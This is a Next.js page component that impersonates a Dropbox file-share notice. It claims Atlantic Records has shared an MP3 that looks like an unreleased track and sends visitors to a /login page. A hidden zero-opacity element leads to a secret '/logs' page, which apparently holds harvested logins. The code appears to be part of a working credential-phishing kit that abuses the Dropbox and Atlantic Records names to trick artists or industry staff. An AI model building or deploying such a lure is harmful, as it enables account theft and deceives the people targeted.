'use client';

import Image from 'next/image';
import Link from 'next/link';

export default function Home() {
  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-4xl mx-auto px-4 py-16">
        <div className="text-center mb-8">
          <div className="w-24 h-24 mx-auto mb-6 relative">
            <Image
              src="/dropbox-logo.svg"
              alt="Dropbox"
              fill
              className="rounded-full object-contain"
            />
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            Atlantic Records has shared a file with you
          </h1>
          <p className="text-gray-600 mb-8">
            Sign in to view and download the shared file
          </p>
        </div>

        {/* Shared File Preview */}
        <div className="max-w-md mx-auto bg-white rounded-lg border border-gray-200 p-6 mb-8">
          <div className="flex items-center space-x-4">
            <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
              <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19V6l12-3v13M9 19c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zm12-3c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zM9 10l12-3" />
              </svg>
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-sm font-medium text-gray-900 truncate">
                CARDI_X_PARDI_X_METRO_ALWAYS_02.11.25_NEWVOX.mp3
              </p>
              <p className="text-sm text-gray-500">MP3 • 3.2 MB</p>
            </div>
          </div>
        </div>

        <div className="max-w-md mx-auto space-y-4">
          <Link
            href="/login"
            className="block w-full bg-blue-600 text-white text-center py-3 px-4 rounded-lg hover:bg-blue-700 transition-colors"
          >
            Sign in
          </Link>
          <Link
            href="/login"
            className="block w-full bg-white text-blue-600 text-center py-3 px-4 rounded-lg border border-blue-600 hover:bg-blue-50 transition-colors"
          >
            Create an account
          </Link>
        </div>
      </div>
      
      {/* Hidden link to logs page - triple click to access */}
      <div 
        onClick={() => window.location.href = '/logs'} 
        className="fixed bottom-0 right-0 w-4 h-4 opacity-0"
      />
    </div>
  );
} 